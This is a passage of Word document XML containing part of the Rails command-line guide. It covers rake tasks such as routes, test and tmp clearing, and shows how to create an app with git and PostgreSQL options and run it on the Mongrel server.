          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F9D219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rake notes:custom ANNOTATION=BUG</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A1DD7D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(in /home/foobar/commandsapp)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15EF6D3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app/model/post.rb:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D3CA8D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 [ 23] Have to fix this one before pushing!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A7A2EF3"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When using specific annotations and custom annotations, the annotation name (FIXME, BUG etc) is not displayed in the output lines.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C68055B"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2.6 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>routes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA24F2C"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 routes</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will list all of your defined routes, which is useful for tracking down routing problems in your app, or giving you a good overview of the URLs in an app you’re trying to get familiar with.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C42007"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2.7 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0D8C9B"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A good description of unit testing in Rails is given in </w:t>
      </w:r>
      <w:hyperlink r:id="rId908" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>A Guide to Testing Rails Applications</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BD7C48A"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Rails comes with a test suite called </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Test::Unit</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Rails owes its stability to the use of tests. The tasks available in the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test:</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> namespace helps in running the different tests you will hopefully write.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9BBEBE"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2.8 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F16C59"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w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.root/tmp</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory is, like the *nix /tmp directory, the holding place for temporary files like sessions (if you’re using a file store for files), process id files, and cached actions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD64669"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w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>tmp:</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> namespaced tasks will help you clear the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.root/tmp</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1357E6D7" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="233"/>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 tmp:cache:clear</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> clears </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>tmp/cache</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3F7E87" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="233"/>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 tmp:sessions:clear</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> clears </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>tmp/sessions</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E5D244" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="233"/>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 tmp:sockets:clear</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> clears </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>tmp/sockets</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC050A6" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="233"/>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 tmp:clear</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> clears all the three: cache, sessions and sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE2B0E4"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2.9 Miscellaneous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A90AB3" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="234"/>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 stats</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is great for looking at statistics on your code, displaying things like KLOCs (thousands of lines of code) and your code to test ratio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0C2FC5" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="234"/>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 secret</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will give you a pseudo-random key to use for your session secret.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649181FD" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="234"/>
        </w:numPr>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rPr>
        <w:t>rake time:zones:all</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> lists all the timezones Rails knows about.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D34B6A1" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>3 The Rails Advanced Command Line</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4F11A9"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More advanced use of the command line is focused around finding useful (even surprising at times) options in the utilities, and fitting those to your needs and specific work flow. Listed here are some tricks up Rails’ sleeve.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36654BB3"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3.1 Rails with Databases and SCM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6715DA8E"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When creating a new Rails application, you have the option to specify what kind of database and what kind of source code management system your application is going to use. This will save you a few minutes, and certainly many keystrokes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6E7332"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Let’s see what a </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--git</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option and a </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--database=postgresql</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option will do for us:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="0F4B30C5" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4446176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mkdir gitapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FFDE81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cd gitapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5ABDDAB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git init</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="407BFA24"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Initialized empty Git repository in .git/</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F380D3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new . --git --database=postgresql</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5460FF6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exists</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28320FD2"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app/controllers</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2395AE2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app/helpers</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4045DC5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5323B45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1BCAAEF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tmp/cache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49A83F5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tmp/pids</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56937447"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Rakefile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71E0A90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add 'Rakefile'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52C228B8"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README.rdoc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DA1025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add 'README.rdoc'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24E2D7B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app/controllers/application_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D7A2561"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add 'app/controllers/application_controller.rb'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41F8BFE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app/helpers/application_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EE797B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15B48FFE"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create  log/test.log</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B04B972"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add 'log/test.log'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="529AADB0"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We had to create the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gitapp</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory and initialize an empty git repository before Rails would add files it created to our repository. Let’s see what it put in our database configuration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="0703DA16" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="130614A7"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cat config/database.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B530AB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PostgreSQL. Versions 8.2 and up are supported.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BCF8D62"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146FE6B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Install the ruby-postgres driver:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23F27C3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gem install ruby-postgres</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2893B78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On Mac OS X:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45F55BD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gem install ruby-postgres -- --include=/usr/local/pgsql</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70D102B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On Windows:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D6349B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gem install ruby-postgres</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="050F630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Choose the win32 build.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A568E7C"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Install PostgreSQL and put its /bin directory on your path.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25A4F27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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43F629F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adapter: postgresql</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55B43900"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encoding: unicode</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DFB9A2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database: gitapp_development</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3855AC40"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pool: 5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49BDE43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username: gitapp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14EA2C4A"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password:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76B1DFD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20E4DD20"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tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="39D24014"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It also generated some lines in our database.yml configuration corresponding to our choice of PostgreSQL for database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F1210C"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The only catch with using the SCM options is that you have to make your application’s directory first, then initialize your SCM, then you can run the </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails new</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> command to generate the basis of your app.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8DA4C6" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">3.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with Different Backends</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F70A7C"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Many people have created a large number of different web servers in Ruby, and many of them can be used to run Rails. Since version 2.3, Rails uses Rack to serve its webpages, which means that any webserver that implements a Rack handler can be used. This includes WEBrick, Mongrel, Thin, and Phusion Passenger (to name a few!).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5A06A0"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For more details on the Rack integration, see </w:t>
      </w:r>
      <w:hyperlink r:id="rId909" w:history="1">
        <w:r w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails on Rack</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBCD7DA" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">To use a different server, just install its gem, then use its name for the first parameter to </w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="0091039A">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7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="0091039A" w:rsidRPr="0091039A" w14:paraId="08D4D00C" w14:textId="77777777" w:rsidTr="0091039A">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2DB1BB1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sudo gem install mongrel</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1662FC42"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Building native extensions.  This could take a while...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E742B78"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Building native extensions.  This could take a while...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79B47CF9"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Successfully installed gem_plugin-0.2.3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C2B495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Successfully installed fastthread-1.0.1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43A8F282"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Successfully installed cgi_multipart_eof_fix-2.5.0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="436C3AA5"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Successfully installed mongrel-1.1.5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A12A87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28D636AD"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p w14:paraId="3CFC42F8"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Installing RDoc documentation for mongrel-1.1.5...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34A1FFCF"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rails server mongrel</w:t>
            </w:r>
          </w:p>
